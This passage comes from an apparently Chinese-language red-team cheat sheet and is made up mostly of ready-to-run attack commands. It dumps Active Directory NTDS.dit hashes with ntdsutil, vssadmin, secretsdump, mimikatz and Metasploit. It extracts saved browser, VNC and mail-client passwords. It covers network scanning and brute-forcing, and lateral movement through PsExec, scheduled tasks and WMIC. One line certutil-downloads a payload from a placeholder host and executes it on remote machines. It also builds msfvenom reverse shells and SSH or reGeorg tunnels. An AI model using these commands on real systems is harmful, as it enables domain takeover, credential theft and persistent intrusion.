id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><pre><code>&gt;ntdsutil&gt;snapshot&gt;activate instance ntds&gt;create&gt;mount &#123;guid&#125;&gt;copy 装载点\windows\NTDS\ntds.dit d:\ntds_save.dit&gt;unmount &#123;guid&#125;&gt;delete &#123;guid&#125;&gt;quit&amp;创建&gt; ntdsutil snapshot “activate instance ntds” create quit quit挂载&gt; ntdsutil snapshot “mount &#123;guid&#125;” quit quit复制&gt;copy c:\$SNAP_XXX_VOLUMEC$\windows\NTDS\ntds.dit d:\ntds_save.dit卸载并删除&gt; ntdsutil snapshot “unmounts &#123;guid&#125;” “delete &#123;guid&#125;” quit quit删除后检测&gt; ntdsutil snapshot “List All” quit quit提取hash&gt; QuarksPwDump -dump-hash-domain -ntds-file d:\ntds_save.dit</code></pre><h4 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h4><pre><code>创建C盘卷影拷贝&gt;vssadmin create shadow /for=c:复制ntds.dit&gt;copy &#123;Shadow Copy Volume Name&#125;\windows\NTDS\ntds.dit c:\ntds.dit删除拷贝&gt;vssadmin delete shadows /for=c: /quiet</code></pre><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><pre><code>Impacket中的secretsdump.py#impacket-secretsdump –system SYSTEM –ntds.dit LOCAL或#impacket-secretsdump –hashs xxx:xxx –just-dc xxx.com/admin\@192.168.1.1</code></pre><h4 id="NTDSDumpex"><a href="#NTDSDumpex" class="headerlink" title="NTDSDumpex"></a>NTDSDumpex</h4><pre><code>&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;&gt;reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hivehttps://github.com/zcgonvh/NTDSDumpEx&gt;NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive</code></pre><h4 id="WMI调用Vssadmin"><a href="#WMI调用Vssadmin" class="headerlink" title="WMI调用Vssadmin"></a>WMI调用Vssadmin</h4><pre><code>&gt;wmic /node:dc /user:xxxx\admin /password:passwd process call create &quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1&quot;&gt;wmic /node:dc /user:P xxxx\admin /password: passwd process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2&gt;&amp;1&quot;&gt;wmic /node:dc /user: xxxx\admin /password: passwd process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2&gt;&amp;1&quot;&gt;copy \\10.0.0.1\c$\temp\ntds.dit C:\tempPS C:\Users\test.PENTESTLAB&gt; copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp</code></pre><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h4><pre><code>PS &gt;Import-Module .\VolumeShadowCopyTools.ps1PS &gt;New-VolumeShadowCopy -Volume C:\PS &gt;Get-VolumeShadowCopy</code></pre><h4 id="Nishang-1"><a href="#Nishang-1" class="headerlink" title="Nishang"></a>Nishang</h4><pre><code>PS &gt;Import-Module .\Copy-VSS.ps1PS &gt;Copy-VSSPS &gt;Copy-VSS -DestinationDir C:\ShadowCopy\或MSF中Meterpreter&gt;load powershellMeterpreter&gt;powershell_import /root/Copy-VSS.ps1Meterpreter&gt;powershell_execute Copy-VSS</code></pre><h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>#lsadump::dcsync /domain:xxx.com /all /csv或#privilege::debug#lsadump::lsa /inject</code></pre><h4 id="MSF-5"><a href="#MSF-5" class="headerlink" title="MSF"></a>MSF</h4><pre><code>#use auxiliary/admin/smb/psexec_ntdsgrab#set rhost smbdomain smbuser smbpass#exploitNtds.dit文件存在/root/.msf4/loot后渗透模块#use windows/gather/credentials/domain_hashdump#set session 1</code></pre><h3 id="laZagne"><a href="#laZagne" class="headerlink" title="laZagne"></a>laZagne</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><pre><code>https://github.com/AlessandroZ/LaZagne&gt;laZagne.exe all -oN获取所有密码输出到文件PowershellPS&gt;[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]PS&gt;$vault = New-Object Windows.Security.Credentials.PasswordVaultPS&gt;$vault.RetrieveAll() | % &#123; $_.RetrievePassword();$_ &#125;</code></pre><h4 id="Linux-4"><a href="#Linux-4" class="headerlink" title="Linux"></a>Linux</h4><pre><code>&gt;python3 laZagne.py all</code></pre><h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><h4 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h4><pre><code>使用Visual studio编译&gt;Seatbelt.exe ALL获取所有信息</code></pre><h4 id="VNC密码"><a href="#VNC密码" class="headerlink" title="VNC密码"></a>VNC密码</h4><pre><code>&gt;reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v passwordhttp://www.cqure.net/wp/tools/password-recovery/vncpwdump/解密&gt;vncpwdump.exe -k hash </code></pre><h4 id="Navicat信息"><a href="#Navicat信息" class="headerlink" title="Navicat信息"></a>Navicat信息</h4><pre><code>&gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v host &gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName &gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwd离线破解https://github.com/HyperSine/how-does-navicat-encrypt-password</code></pre><h4 id="Chrome保存的密码"><a href="#Chrome保存的密码" class="headerlink" title="Chrome保存的密码"></a>Chrome保存的密码</h4><pre><code>&gt;mimikatz dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</code></pre><h4 id="Foxmail"><a href="#Foxmail" class="headerlink" title="Foxmail"></a>Foxmail</h4><pre><code>X:\Foxmail\storage\xxx\Accounts\Account.rec0使用Foxmail Password Decryptor解密https://securityxploded.com/foxmail-password-decryptor.php</code></pre><h4 id="firefox保存的密码"><a href="#firefox保存的密码" class="headerlink" title="firefox保存的密码"></a>firefox保存的密码</h4><pre><code>https://www.nirsoft.net/password_recovery_tools.html&gt;webbrowserpassview.exe /LoadPasswordsFirefox 1 /shtml &quot;c:\1.html&quot;或&gt;dir %appdata%\Mozilla\Firefox\Profiles\&gt;dir %appdata%\Mozilla\Firefox\Profiles\yn80ouvt.default需先结束firefox.exe进程压缩&gt;7z.exe -r -padmin123 a c:\users\public\firefox.7z C:\Users\Administrator\AppData\Roaming\Mozilla\*.* https://github.com/unode/firefox_decrypthttps://securityxploded.com/firefox-master-password-cracker.php</code></pre><h4 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h4><pre><code>C:\Documents and Settings\Administrator\Application Data\VanDyke下的config文件夹C:\program files\Vandyke software\securecrt\https://github.com/uknowsec/SharpDecryptPwd</code></pre><h2 id="横向-2"><a href="#横向-2" class="headerlink" title="横向"></a>横向</h2><h3 id="探测存活主机-1"><a href="#探测存活主机-1" class="headerlink" title="探测存活主机"></a>探测存活主机</h3><h4 id="For-Ping命令查询存活主机"><a href="#For-Ping命令查询存活主机" class="headerlink" title="For+Ping命令查询存活主机"></a>For+Ping命令查询存活主机</h4><pre><code>&gt;for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.0.%I |findstr &quot;TTL=&quot;</code></pre><p><img src="./img/317.png" alt="image"></p><pre><code>For+Ping命令查询域名对应IP&gt;for /f &quot;delims=&quot; %i in (D:/domains.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[192.&quot; &gt;&gt; c:/windows/temp/ds.txt</code></pre><h4 id="内外网资产对应"><a href="#内外网资产对应" class="headerlink" title="内外网资产对应"></a>内外网资产对应</h4><pre><code>1.将收集到的子域名保存，使用ping命令在内网循环for /f &quot;delims=&quot; %i in (host.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[10.&quot; /c:&quot;[192.&quot; /c:&quot;[172.&quot; &gt;&gt; C:/users/public/out.txt2.找到dns服务器ip，ipconfig或扫描开启53端口的机器https://github.com/Q2h1Cg/dnsbrutednsbrute.exe -domain a.com -dict ziyuming.txt -rate 1000 -retry 1 -server 192.168.1.1:533.扫描内网ip开启web服务的title</code></pre><h4 id="NbtScan"><a href="#NbtScan" class="headerlink" title="NbtScan"></a>NbtScan</h4><pre><code>Windows&gt;nbtscan.exe -m 192.168.1.0/24Linux#nbtscan -r 192.168.0.0/24</code></pre><h4 id="NMAP-1"><a href="#NMAP-1" class="headerlink" title="NMAP"></a>NMAP</h4><pre><code>#nmap -Pn -open -A -n -v -iL filename.txt-Pn：跳过主机发现-n:不做DNS解析-open：只显示开启的端口-A：扫描过程中，输入回车，可以查看扫描进度-v：显示详细信息-F：快速扫描100个常见端口-p:选择要扫描的端口  例： -p1-65535 （全端口扫描，中间没有空格）-iL：为程序指定一个要扫描的IP列表-sV：探测开放端口的服务和版本信息-T可以选择扫描等级，默认T3，但想快点话，可以输入  -T4存活主机&gt;nmap -sP -PI 192.168.0.0/24&gt;nmap -sn -PE -T4 192.168.0.0/24&gt;nmap -sn -PR 192.168.0.0/24</code></pre><h5 id="代理nmap扫描"><a href="#代理nmap扫描" class="headerlink" title="代理nmap扫描"></a>代理nmap扫描</h5><pre><code>meterpreter &gt; backgroundmsf &gt; use auxiliary/server/socks4a再配置proxychains.conf#proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 内网IP</code></pre><h4 id="NetDiscover"><a href="#NetDiscover" class="headerlink" title="NetDiscover"></a>NetDiscover</h4><pre><code>#netdiscover -r 192.168.0.0/24 -i wlan0</code></pre><h4 id="rp-scan"><a href="#rp-scan" class="headerlink" title="rp-scan"></a>rp-scan</h4><pre><code>kali&gt;arp-scan --interface=wlan0 -localnetWindows&gt;arp-scan.exe -t 192.168.0.0/24</code></pre><h4 id="MSF-6"><a href="#MSF-6" class="headerlink" title="MSF"></a>MSF</h4><pre><code>#use auxiliary/scanner/discovery/arp_sweep</code></pre><p><img src="./img/318.png" alt="image"></p><pre><code>#use auxiliary/scanner/discovery/udp_sweep</code></pre><p><img src="./img/319.png" alt="image"></p><pre><code>#use auxiliary/scanner/netbios/nbnamemeterpreter&gt;run post/windows/gather/arp_scanner RHOSTS=192.168.1.1/24meterpreter&gt;run post/multi/gather/ping_sweep RHOSTS=192.168.1.1/24</code></pre><h3 id="探测服务-amp-端口"><a href="#探测服务-amp-端口" class="headerlink" title="探测服务&amp;端口"></a>探测服务&amp;端口</h3><pre><code>常见端口</code></pre><table><thead><tr><th>服务</th><th>端口</th></tr></thead><tbody><tr><td>Mssql</td><td>1433</td></tr><tr><td>SMB</td><td>445</td></tr><tr><td>WMI</td><td>135</td></tr><tr><td>winrm</td><td>5985</td></tr><tr><td>rdp</td><td>3389</td></tr><tr><td>ssh</td><td>22</td></tr><tr><td>oracle</td><td>1521</td></tr><tr><td>mysql</td><td>3306</td></tr><tr><td>redis</td><td>6379</td></tr><tr><td>postgresql</td><td>5432</td></tr><tr><td>ldap</td><td>389</td></tr><tr><td>smtp</td><td>25</td></tr><tr><td>pop3</td><td>110</td></tr><tr><td>imap</td><td>143</td></tr><tr><td>exchange</td><td>443</td></tr><tr><td>vnc</td><td>5900</td></tr><tr><td>ftp</td><td>21</td></tr><tr><td>rsync</td><td>873</td></tr><tr><td>mongodb</td><td>27017</td></tr><tr><td>telnet</td><td>23</td></tr><tr><td>svn</td><td>3690</td></tr><tr><td>java rmi</td><td>1099</td></tr><tr><td>couchdb</td><td>5984</td></tr><tr><td>pcanywhere</td><td>5632</td></tr><tr><td>web</td><td>80-90,8000-10000,7001,9200,9300</td></tr></tbody></table><h4 id="Powershell-3"><a href="#Powershell-3" class="headerlink" title="Powershell"></a>Powershell</h4><h5 id="Powersploit"><a href="#Powersploit" class="headerlink" title="Powersploit"></a>Powersploit</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Recon/Invoke-Portscan.ps1&#39;); Invoke-Portscan -Hosts 192.168.0.0/24 –T 4 -Ports &#39;1-65535&#39; -oA C:\TEMP.txt&quot;</code></pre><h5 id="Nishang-2"><a href="#Nishang-2" class="headerlink" title="Nishang"></a>Nishang</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Scan/Invoke-PortScan.ps1&#39;); Invoke-Portscan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort&quot;</code></pre><p><img src="./img/320.png" alt="image"></p><pre><code>去掉scanport就是探测存活</code></pre><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><pre><code>https://github.com/ShawnDEvans/smbmap</code></pre><h5 id="MSF-7"><a href="#MSF-7" class="headerlink" title="MSF"></a>MSF</h5><pre><code>#use auxiliary/scanner/smb/smb_version查询开启139，445端口主机#use auxiliary/scanner/smb/smb_login 爆破</code></pre><h5 id="NMAP-2"><a href="#NMAP-2" class="headerlink" title="NMAP"></a>NMAP</h5><pre><code>#nmap -sU -sS --script smb-enum-shares.nse -p 445 192.168. 1.119</code></pre><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><pre><code>&gt;for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445</code></pre><h4 id="Linux-Samba服务"><a href="#Linux-Samba服务" class="headerlink" title="Linux Samba服务"></a>Linux Samba服务</h4><pre><code>端口一般139，弱口令连接&gt;smbclient -L 192.168.0.110&gt;smbclient &#39;\\192.168.0.110\IPC$&#39;#use exploit/linux/samba/is_known_pipenamea</code></pre><h4 id="MSF-8"><a href="#MSF-8" class="headerlink" title="MSF"></a>MSF</h4><h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><pre><code>#use auxiliary/scanner/portscan/tcp#use auxiliary/scanner/portscan/ack</code></pre><h5 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h5><pre><code>#use auxiliary/scanner/ftp/ftp_version 开启FTP的机器#use auxiliary/scanner/ftp/anonymous 允许匿名登录的FTP#use auxiliary/scanner/ftp/ftp_login FTP爆破#use auxiliary/scanner/http/http_version 开启HTTP服务的#use auxiliary/scanner/smb/smb_version 开启SMB服务的#use auxiliary/scanner/smb/smb_enumshares 允许匿名登录的SMB#use auxiliary/scanner/smb/smb_login SMB爆破#use auxiliary/scanner/ssh/ssh_version 开启SSH的机器#use auxiliary/scanner/ssh/ssh_login SSH爆破#use auxiliary/scanner/telnet/telnet_version 开启TELNET服务的#use auxiliary/scanner/telnet/telnet_login TELNET爆破#use auxiliary/scanner/mysql/mysql_version 开启MYSQL服务的#use auxiliary/scanner/mysql/mysql_login MYSQL爆破#use auxiliary/scanner/mssql/mssql_ping 开启SQLSERVER服务的#use auxiliary/scanner/mssql/mssql_login MSSQL爆破#use auxiliary/scanner/postgres/postgres_version开启POSTGRE服务的#use auxiliary/scanner/postgres/postgres_login POSTGRESQL爆破#use auxiliary/scanner/oracle/tnslsnr_version 开启oracle数据库的#use auxiliary/admin/oracle/oracle_login Oracle数据库爆破#use auxiliary/scanner/http/title 扫描HTTP标题#use auxiliary/scanner/rdp/rdp_scanner 开启RDP服务的#use auxiliary/scanner/http/webdav_scanner#use auxiliary/scanner/http/http_put 开启WEBDAV的#use auxiliary/scanner/smb/smb_ms17_010 存在17010漏洞的#use auxiliary/scanner/http/zabbix_login zabbix爆破#use auxiliary/scanner/http/axis_login axis爆破#use auxiliary/scanner/redis/redis_login redis爆破</code></pre><h4 id="Nc"><a href="#Nc" class="headerlink" title="Nc"></a>Nc</h4><pre><code>&gt;nc -znv 192.168.0.98 1-65535</code></pre><p><img src="./img/321.png" alt="image"></p><pre><code>&gt;nc -v -w 1 192.168.0.110 -z 1-1000&gt;for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.0.$i 21-25 -z; done</code></pre><h4 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h4><pre><code>$sudo apt-get install clang git gcc make libpcap-dev$git clone https://github.com/robertdavidgraham/masscan$cd masscan$make &gt;masscan -p80,3389,1-65535 192.168.0.0/24</code></pre><p><img src="./img/322.png" alt="image"></p><h4 id="PTScan"><a href="#PTScan" class="headerlink" title="PTScan"></a>PTScan</h4><pre><code>友好识别web服务https://github.com/phantom0301/PTscan/blob/master/PTscan.py&gt;python PTscan.py &#123;-f /xxx/xxx.txt or -h 192.168.1&#125; [-p 21,80,3306]  [-m 50] [-t 10] [-n(不ping)] [-b(开启banner扫描)] [-r查找IP]80,81,82,83,84,85,86,87,88,89,90,91,901,18080,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,443,8443,7001</code></pre><h4 id="CobaltStrike-K8-Aggressor"><a href="#CobaltStrike-K8-Aggressor" class="headerlink" title="CobaltStrike+K8 Aggressor"></a>CobaltStrike+K8 Aggressor</h4><pre><code>https://github.com/k8gege/Aggressor</code></pre><h5 id="存活主机"><a href="#存活主机" class="headerlink" title="存活主机"></a>存活主机</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 OnlinePC</code></pre><p><img src="./img/323.png" alt="image"></p><h5 id="MS17010"><a href="#MS17010" class="headerlink" title="MS17010"></a>MS17010</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 MS17010</code></pre><p><img src="./img/324.png" alt="image"></p><h5 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 Osscan</code></pre><p><img src="./img/325.png" alt="image"></p><h5 id="内网站点banner、标题扫描"><a href="#内网站点banner、标题扫描" class="headerlink" title="内网站点banner、标题扫描"></a>内网站点banner、标题扫描</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 WebScan</code></pre><h5 id="FTP爆破"><a href="#FTP爆破" class="headerlink" title="FTP爆破"></a>FTP爆破</h5><pre><code>上传账户密码文件user.txt、pass.txt到beacon目录(beacon&gt;pwd)beacon&gt;Cscan 192.168.0.0/24 FtpScan</code></pre><h5 id="WMI爆破windows账户密码"><a href="#WMI爆破windows账户密码" class="headerlink" title="WMI爆破windows账户密码"></a>WMI爆破windows账户密码</h5><pre><code>上传账户密码文件user.txt、pass.txt到beacon目录(beacon&gt;pwd)beacon&gt;Cscan 192.168.0.0/24 WmiScan</code></pre><h5 id="思科设备扫描"><a href="#思科设备扫描" class="headerlink" title="思科设备扫描"></a>思科设备扫描</h5><pre><code>beacon&gt;Cscan 192.168.0.0/24 CiscoScan</code></pre><h5 id="枚举共享"><a href="#枚举共享" class="headerlink" title="枚举共享"></a>枚举共享</h5><pre><code>beacon&gt; EnumShare</code></pre><h5 id="枚举SQL-SERVER数据库"><a href="#枚举SQL-SERVER数据库" class="headerlink" title="枚举SQL SERVER数据库"></a>枚举SQL SERVER数据库</h5><pre><code>beacon&gt; EnumMSSQL</code></pre><h3 id="执行命令-amp-IPC-amp-计划任务"><a href="#执行命令-amp-IPC-amp-计划任务" class="headerlink" title="执行命令&amp;IPC&amp;计划任务"></a>执行命令&amp;IPC&amp;计划任务</h3><pre><code>建立连接&gt;net use \\192.168.1.2\ipc$ &quot;password&quot; /user:domain\administrator查看连接&gt;net use列文件&gt;dir \\192.168.1.2\c$查看系统时间&gt;net time \\192.168.1.2上传文件&gt;copy 1.exe \\192.168.1.2\c$下载文件&gt;copy \\192.168.1.2\c$\1.exe 1.exe批量IPC@echo offecho check ip addr config file…if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file…for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd:endexit</code></pre><h4 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h4><pre><code>&gt;net use \\192.168.1.2\ipc$ &quot;password&quot; /user:domain\administrator&gt;copy 1.exe \\192.168.1.2\c$&gt;net time \\192.168.1.2&gt;at \\192.168.1.2 1:00AM c:\1.exe&gt;at \\192.168.1.2 1:00AM cmd.exe /c “ipconfig &gt;c:/1.txt”&gt;type \\192.168.1.2\c$\1.txt查看计划任务&gt;at \\192.168.1.2删除计划任务&gt;at \\192.168.1.2 计划ID /delete横向批量上线&gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;certutil.exe -urlcache -split -f http://youip.com:80/shell.txt c:/windows/debug/SysDug.exe&quot; &gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;c:/windows/debug/SysDug.exe&quot; &gt;atexec.exe ./administrator:pass@10.1.1.1 &quot;certutil.exe -urlcache -split -f c:/windows/debug/SysDug.exe delete&quot;</code></pre><h4 id="Schtasks-1"><a href="#Schtasks-1" class="headerlink" title="Schtasks"></a>Schtasks</h4><pre><code>&gt;net use \\192.168.0.55\ipc$ &quot;password&quot; /user:&quot;domain\administrator&quot;&gt;schtasks /query /fo LIST /v 查看计划任务上传文件&gt;copy ok.exe \\192.168.0.55\c$\windows\temp远程创建定时任务 &gt;schtasks /create /s &quot;192.168.0.55&quot; /u &quot;admin&quot; /p &quot;qqq23&quot; /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\windows\temp\ok.exe&quot; /sc DAILY /mo 1 /ST 20:28 /RU SYSTEM查询远程创建的任务&gt;schtasks /query /s &quot;192.168.0.55&quot; /U &quot;admin&quot; /P &quot;qqq23&quot; | findstr &quot;windowsupdate&quot; 立即执行远程任务&gt;schtasks /run /tn windowsupdate /s &quot;192.168.0.55&quot; /U &quot;admin&quot; /P &quot;qqq23&quot; 删除定时任务 &gt;schtasks /Delete /tn windowsupdate /F /s &quot;192.168.0.55&quot; /u &quot;admin&quot; /p &quot;qqq23&quot;删除IPC&gt;net user name /del /y横向批量上线&gt;for /f %i in (ip.txt) do net use \\%i\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy ok.exe \\%i\admin$\debug\ /Y ) &amp; wmic /NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\debug\ok.exe&quot; &amp; @ping 127.0.0.1 -n 8 &gt;nul &amp; net use \\%i\admin$ /del</code></pre><h4 id="WMIC-1"><a href="#WMIC-1" class="headerlink" title="WMIC"></a>WMIC</h4><pre><code>&gt;net use \\192.168.0.55\ipc$ &quot;password&quot; /user:&quot;domain\administrator&quot;&gt;copy ok.exe \\192.168.0.55\c$\windows\temp&gt;wmic /NODE:&quot; 192.168.0.55&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\temp\ok.exe&quot;&gt;del \\192.168.0.55\c$\windows\temp\ok.exe /F&gt;net use \\192.168.0.55\c$ /del</code></pre><h3 id="快速定位域管理登过的机器"><a href="#快速定位域管理登过的机器" class="headerlink" title="快速定位域管理登过的机器"></a>快速定位域管理登过的机器</h3><pre><code>&gt;psexec –accepteula @ips.txt –u admin –p pass@123 –c 1.bat#1.bat内容tasklist /v | find “域管理名字”@echo offecho check ip addr config file…if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file…for /F “eol=#” %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p pass@123 /v) &gt;&gt;d:\result.txt:endexit</code></pre><h3 id="MSF添加路由"><a href="#MSF添加路由" class="headerlink" title="MSF添加路由"></a>MSF添加路由</h3><pre><code># route add 内网网卡ip 子网掩码 session的id# route list&amp;Meterpreter&gt;run get_local_subnets查看网段信息再添加路由# run autoroute -s内网网卡ip/24# run autoroute -p 查看路由表&amp;Meterpreter&gt;run post/multi/manage/autoroute</code></pre><h3 id="MSF管道监听"><a href="#MSF管道监听" class="headerlink" title="MSF管道监听"></a>MSF管道监听</h3><pre><code>在已经获得meterpreter的机器上配置管道监听器meterpreter &gt; pivot add -t pipe -l 已控IP -n bgpipe -a x86 -p windows生成&gt;msfvenom -p windows/meterpreter/reverse_named_pipe PIPEHOST=已控IP PIPENAME=bgpipe -f exe -o pipe.exe.</code></pre><h3 id="代理-1"><a href="#代理-1" class="headerlink" title="代理"></a>代理</h3><h4 id="SSH-2"><a href="#SSH-2" class="headerlink" title="SSH"></a>SSH</h4><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h5><pre><code>SSH动态转发，是建立正向加密的socks通道出网靶机编辑后restart ssh服务#vim /etc/ssh/sshd_confAllowTcpForwarding yes 允许TCP转发GatewayPorts yes   允许远程主机连接本地转发的端口TCPKeepAlive yes    TCP会话保持存活PasswordAuthentication yes  密码认证外部攻击机执行&gt;ssh -C -f -N -g -D 0.0.0.0:12138 root@出网靶机IP -p 22MSF中设置全局代理或使用其他软件&gt;setg proxies socks5:0.0.0.0:12138即可进行攻击隔离区机器</code></pre><p><img src="./img/326.png" alt="image"><br><img src="./img/327.png" alt="image"></p><h5 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h5><pre><code>#vim /etc/ssh/sshd_confAllowTcpForwarding yes 允许TCP转发GatewayPorts yes   允许远程主机连接本地转发的端口TCPKeepAlive yes    TCP会话保持存活PasswordAuthentication yes  密码认证ClientAliveInterval 修改为30-60保持连接ClientAliveCountMax 取消注释 发送请求没响应自动断开次数107是外网攻击机内网靶机执行：&gt;ssh -p 22 -qngfNTR 12138:127.0.0.1:22 root@192.168.0.107</code></pre><p><img src="./img/328.png" alt="image"></p><pre><code>攻击机执行&gt;ssh -p 12138 -qngfNTD 12345 root@192.168.0.107</code></pre><p><img src="./img/329.png" alt="image"></p><pre><code>隧道建立，可使用代理软件配置攻击机外网IP:12345访问内网</code></pre><p><img src="./img/330.png" alt="image"></p><h5 id="SSH隧道-rc4双重加密"><a href="#SSH隧道-rc4双重加密" class="headerlink" title="SSH隧道+rc4双重加密"></a>SSH隧道+rc4双重加密</h5><pre><code>生成木马&gt;msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 rc4password=123456 lport=446 -f exe -o /var/www/html/bind.exeMSF设置&gt;setg proxies socks5:0.0.0.0:12138&gt;use exploit/multi/handler&gt;set payload windows/x64/meterpreter/bind_tcp_rc4&gt;set rc4password 123456&gt;set rhost 10.1.1.97&gt;set lport 446</code></pre><p><img src="./img/331.png" alt="image"></p><h5 id="公网SSH隧道-Local-MSF"><a href="#公网SSH隧道-Local-MSF" class="headerlink" title="公网SSH隧道+Local MSF"></a>公网SSH隧道+Local MSF</h5><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=公网IP LPORT=12138 -f exe –o /var/www/html/1.exeHandler监听本地IP:12138SSH转发&gt;ssh -N -R 12138:本地内网IP:12138 root@公网IP</code></pre><h4 id="socks4a"><a href="#socks4a" class="headerlink" title="socks4a"></a>socks4a</h4><pre><code>#use auxiliary/server/socks4a#set srvhost 0.0.0.0#set srvport 1080#run多层网络再多配置个端口Win: Proxifier&amp; Sockscap64Linux: proxychains&amp; 浏览器&amp;meterpreter &gt; ipconfig IP Address : 10.1.13.3 meterpreter &gt; run autoroute -s 10.1.13.0/24 meterpreter &gt; run autoroute -p 10.1.13.0 255.255.255.0 Session 1 meterpreter &gt; bg msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec msf exploit(psexec) &gt; set RHOST 10.1.13.2 msf exploit(psexec) &gt; exploit </code></pre><h4 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h4><pre><code>#use auxiliary/server/socks5#set srvhost 0.0.0.0#set srvport 1080#run浏览器</code></pre><h4 id="基于web的socks5"><a href="#基于web的socks5" class="headerlink" title="基于web的socks5"></a>基于web的socks5</h4><h5 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h5><pre><code>https://github.com/sensepost/reGeorg&gt;python reGeorgSocksProxy.py -u http://靶机/tunnel.aspx -l 外网IP -p 10080打开Proxifier，更改为脚本指定的端口10080</code></pre><p><img src="./img/332.png" alt="image"></p><pre><code>或proxychains#vim /etc/proxychains.conf去掉dynamic_chain注释&gt;添加socks5 127.0.0.1 10080</code></pre><p><img src="./img/333.png" alt="image"></p><pre><code>或MSF&gt;setg proxies socks5:外网IP:10080&gt;setg ReverseAllowProxy true 允许反向代理</code></pre><p><img src="./img/334.png" alt="image"></p><h5 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h5><pre><code>Step 1. 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器$ python3 neoreg.py generate -k password</code></pre><p><img src="./img/335.png" alt="image"></p><pre><code>伪装页面$ python3 neoreg.py generate -k &lt;you_password&gt; --file 404.htmlStep 2. 使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理$ python3 neoreg.py -k password -u http://xx/tunnel.php$ python3 neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --skip开启代理$ python neoreg.py -k &lt;you_password&gt; -l 外网IP -p 10081 -u http://xx/neo-tunnel.aspx</code></pre><p><img src="./img/336.png" alt="image"><br><img 